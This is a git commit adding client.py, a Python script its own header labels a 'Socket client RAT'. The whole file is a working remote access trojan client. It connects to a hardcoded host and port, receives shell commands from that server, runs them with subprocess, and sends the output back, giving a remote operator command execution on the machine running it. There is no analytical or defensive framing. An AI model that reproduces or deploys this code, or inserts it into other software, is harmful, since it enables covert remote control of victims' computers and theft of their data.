54e5eb0a9e981097ed3d4acfc6f72d81412595e3
yakumai <36227758+yakumai@users.noreply.github.com>
2018-02-08 10:48:11 +0100

    Add files via upload

---
+++ client.py
@@ -0,0 +1,30 @@
+#######################################################
+#            Socket client RAT                        #
+#                 Yakumai                             #
+#######################################################
+import socket
+import subprocess
+
+target_host = "192.168.1.1"
+target_port = 1335
+
+#creation socket
+client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+print 'connexion à l hote distant'
+client.connect((target_host,target_port)) 
+
+while 1:
+      #envoie du resultat au serveur
+      command = client.recv(4096)
+      if command=="end":
+            break
+      proc2 = subprocess.Popen(command,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+
+      args = proc2.stdout.read()
+
+      client.send(args)
+
+
+client.close()
+
+
